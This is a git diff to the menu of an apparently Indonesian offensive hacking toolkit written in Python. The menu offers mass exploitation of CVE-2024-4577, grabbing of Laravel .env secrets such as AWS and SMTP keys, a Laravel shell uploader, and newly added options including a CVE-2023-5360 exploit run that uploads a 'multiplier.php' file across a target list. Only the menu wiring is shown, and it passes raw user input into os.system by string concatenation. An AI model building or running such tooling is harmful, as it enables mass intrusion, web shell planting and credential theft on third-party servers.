@@ -437,15 +437,21 @@ def tool_laravel_auto_shell():
 def menu():
     while True:
         print(f"""\n{mg}=== MENU TOOLS ===
-{gr}1{res}. Exploit CVE-2024-4577 (Mass Include)
+{gr}1{res}. Exploit CVE-2024-4577 (Mass Include)            
 {gr}2{res}. Grabber Laravel .env (AWS, SMTP, dll)
 {gr}3{res}. Scanner CVE-2024-9593 (WP etimeclockwp)
 {gr}4{res}. Admin Page Finder
 {gr}5{res}. Subdomain Scanner
 {gr}6{res}. Log Splitter (Pisahkan URL)
 {gr}7{res}. Laravel Auto Shell Uploader (NEMESIS)
-{gr}0{res}. Keluar""")
-        pilih = input(f"{bl}>>> Pilih tools (0-7): {wh}")
+{gr}8{res}. Grabber
+{gr}9{res}. WP-Install
+{gr}10{res}. Exploit CVE-2023-5360
+{gr}11{res}. Hunter Search Toolz
+{gr}0{res}. Keluar
+{mg}==DIPUJI GA TERBANG DIHINA WAR KITA BANG?==""")
+
+        pilih = input(f"{bl}>>> Pilih tools : {wh}")
 
         if pilih == "1":
             tool_exploit_cve_2024_4577()
@@ -461,6 +467,15 @@ def menu():
             tool_log_splitter()
         elif pilih == "7":
             tool_laravel_auto_shell()
+        elif pilih == "8":
+            os.system('python3 Grabber/grab.py')
+        elif pilih == "9":
+            os.system('python3 Toolz/wp-install.py')
+        elif pilih == "10":
+            target = input(f'{gr}Give Me Your Target ex list.txt{wh}/{red} > {gr}${res} ')
+            os.system('python3 Toolz/royaltheme.py -o Result/CVE-2023-5360_Result.txt -f multiplier.php -l' + target)
+        elif pilih == "11":
+            os.system('python3 Toolz/hunter.py')
         elif pilih == "0":
             print(f"{gr}[✓] Keluar dari program.{res}")
             break
